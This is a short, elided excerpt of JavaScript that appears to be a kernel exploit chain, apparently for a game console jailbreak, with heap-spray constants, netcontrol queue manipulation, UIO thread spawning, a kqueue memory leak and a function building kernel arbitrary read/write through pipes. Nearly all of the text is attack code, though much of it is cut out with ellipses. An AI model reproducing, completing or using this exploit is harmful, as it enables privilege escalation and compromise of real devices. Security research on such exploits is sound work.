...
var FIND_TRIPLET_NUM = 0x10;
var SPRAY_IOV_NUM = 0x400;
var SPRAY_UIO_NUM = 0x400;
...
function netcontrol_clear_queue(sock) {
    ...
    if (netcontrol.invoke(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, addr, sz).eq(-1)) {
        throw new SyscallError(`Unable to clear ${sock} from netevent queue !!`);
    }
}
...
function spawn_uio_threads() {
    ...
    for (var i = 0; i < uio_threads.length; i++) {
        ...
        var script = userland + `\n\nvar thrd_name = "${name}";` + worker + uio_start;
...
function leak_kqueue() {
    ...
    for (var i = 0; i < LEAK_KQUEUE_NUM; i++) {
        ...
        var kq_hdr = view(leak_rthdr0_addr).getInt32(8, true);
        if (kq_hdr === 0x1430000) {
...
function make_karw() {
    ...
    debug(`slave_pipe_data[0]: ${slave_pipe_f_data}`);
